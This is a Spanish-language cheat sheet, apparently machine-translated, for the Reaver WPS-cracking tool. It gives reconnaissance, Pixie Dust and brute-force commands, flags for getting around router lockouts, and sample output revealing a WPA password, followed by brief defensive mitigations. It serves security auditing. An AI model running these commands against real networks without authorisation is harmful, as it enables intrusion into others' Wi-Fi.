<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de trucos de Reaver

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) es una herramienta especializada de auditoría de seguridad Wi-Fi diseñada para ejecutar ataques de fuerza bruta contra los PIN del registrador de configuración protegida Wi-Fi (WPS). Al recuperar el PIN WPS de 8 dígitos, Reaver recupera la clave precompartida (PSK) WPA/WPA2 en texto plano. También admite ataques Pixie Dust sin conexión a través de `pixiewps`.

---

## Tabla de contenidos

- [Mecánicas de vulnerabilidad WPS](#wps-vulnerabilidad-mecánica)
- [Instalación (`reaver` y `pixiewps`)](#installation-reaver--pixiewps)
- [Reconocimiento: Identificación de redes WPS (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Ataque de Pixie Dust (recuperación instantánea de claves)](#pixie-dust-attack-instant-key-recovery)
- [Fuerza bruta del PIN WPS en línea completo](#fuerza-bruta-pin-wps-en línea completo)
- [Limitación de tasa AP y manejo de bloqueo](#ap-rate-limiting--lockout-handling)
- [Mitigación defensiva](#mitigación-defensiva)

---

## Mecánica de vulnerabilidad de WPS

La autenticación PIN de WPS utiliza un PIN de 8 dígitos dividido en dos mitades:
- La primera mitad tiene 4 dígitos ($10^4 = 10,000$ posibilidades).
- La segunda mitad tiene 3 dígitos + 1 dígito de suma de verificación ($10^3 = 1000$ posibilidades).
- En lugar de probar combinaciones de $10^8 = 100.000.000$, un atacante solo prueba como máximo $10.000 + 1.000 = 11.000$ intentos.
- **Pixie Dust Attack:** Explota PRNG (generadores de números pseudoaleatorios) débiles en conjuntos de chips inalámbricos específicos (Ralink, MediaTek, Realtek, Broadcom) para calcular el PIN WPS sin conexión en segundos a partir de solo 2 paquetes iniciales.

---

## Instalación (`reaver` y `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Reconocimiento: identificación de redes WPS (`wash`)

Antes de iniciar Reaver, busque puntos de acceso con WPS habilitado y verifique si están bloqueados:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Columnas clave a observar:
- **`WPS Locked`**: si es `Yes`, el enrutador ha bloqueado los intentos de PIN de WPS debido a una actividad de fuerza bruta previa. Enrutadores de destino que muestran `No`.
- **`WPS Ver`**: versión WPS (1.0 o 2.0).
- **`ESSID` y `BSSID`**: nombre de red de destino y MAC.

---

## Ataque de polvo de duendecillo (recuperación instantánea de claves)

El ataque Pixie Dust (`-K 1`) es el ataque más rápido contra WPS. Recopila E-Hash1, E-Hash2 y nonces del enrutador y descifra el PIN fuera de línea sin activar límites de velocidad:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Interfaz en modo monitor.
- `-b <bssid>`: MAC del enrutador de destino.
- `-c 6`: Canal del AP objetivo.
- `-K 1`: ejecuta el ataque automático de Pixie Dust a través de `pixiewps`.
- `-vv`: Salida detallada.

*Si es vulnerable, el PIN y WPA PSK se imprimen en menos de 10 segundos.*

---

## Fuerza bruta del PIN WPS completo en línea

Si Pixie Dust falla, recurra a la fuerza bruta en línea:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Una vez que se descubre el PIN, Reaver genera:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## Limitación de tasa de AP y manejo de bloqueo

Muchos enrutadores modernos bloquean los intentos de WPS durante 5 a 15 minutos después de 3 a 5 intentos fallidos. Utilice indicadores de ajuste de retardo y reintento:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternativa: usar `bully`
`bully` es una implementación C rápida del ataque WPS que maneja bien implementaciones de enrutadores extrañas:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Mitigación defensiva

- **Desactivar WPS por completo:** La recomendación más segura es desactivar WPS en la interfaz web del enrutador.
- **Actualización de firmware:** Los enrutadores modernos implementan una estricta limitación de velocidad, un retroceso exponencial y corrigen fallas de entropía PRNG explotadas por Pixie Dust.
- **Usa WPA3:** WPA3 elimina por completo el WPS heredado basado en PIN, reemplazándolo con Wi-Fi Easy Connect (DPP) seguro.